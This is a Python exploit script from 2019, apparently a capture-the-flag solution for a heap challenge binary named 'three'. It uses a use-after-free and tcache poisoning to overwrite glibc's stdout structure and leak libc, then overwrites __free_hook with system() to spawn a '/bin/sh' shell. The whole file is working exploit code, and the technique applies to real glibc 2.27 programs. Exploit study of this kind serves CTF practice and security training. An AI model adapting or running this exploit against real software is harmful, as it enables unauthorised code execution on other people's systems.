# File: exp.py
# Author: raycp
# Date: 2019-06-06
# Description: exp for three, uaf to brute force to overwrite stdout to leak libc

from pwn_debug import *


pdbg=pwn_debug("./three")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()


def add(content):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("ontent:")
    p.send(content)

def edit(idx,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil(" idx:")
    p.sendline(str(idx))
    p.recvuntil("content:")
    p.send(content)

def delete(idx,choice='n'):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil(" idx:")
    p.sendline(str(idx))
    p.recvuntil("(y/n):")
    p.sendline(choice)

def pwn():
    
    #pdbg.bp()
    add('0')
    add((p64(0x0)+p64(0x11))*4)
    #delete(0)
    delete(1,'y')
    delete(0)
    delete(0)
    delete(0)
    edit(0,p8(0x50)) 
    add('1')
    
    # overlap chunk in 2 and 0
    add(p64(0)+p64(0x91)) #2

    for i in range(0,7):
        delete(1)

    #pdbg.bp([0xd02,0xb87])
    ## brute force stdout to leak
    edit(2,p64(0)+p64(0x51))
    delete(0,'y')
    edit(2,p64(0)+p64(0x91))
    delete(1,'y')
    stdout_addr=membp.libc_base+libc.symbols['_IO_2_1_stdout_']
    write_ptr=stdout_addr+0x28
    edit(2,p64(0)+p64(0x51)+p16(write_ptr&0xffff))
    #pdbg.bp(0xb87)
    add('0')
    add(p8(0xf0)) #1
    p.recv(5)
    leak_addr=u64(p.recv(8))
    libc_base=leak_addr-libc.symbols['_IO_stdfile_1_lock']
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc base: %s"%(hex(libc_base)))
    
    #pdbg.bp([0xd02,0xb87])
    delete(0,'y')
    edit(2,'/bin/sh\x00'+p64(0x41)+p64(free_hook))
    #pdbg.bp([0xd02,0xb87])
    
    add('0')

    delete(0,'y')
    add(p64(system_addr))
   
    # trigger free 
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil(" idx:")
    p.sendline('2')
    p.interactive() 

if __name__ == '__main__':
   pwn()


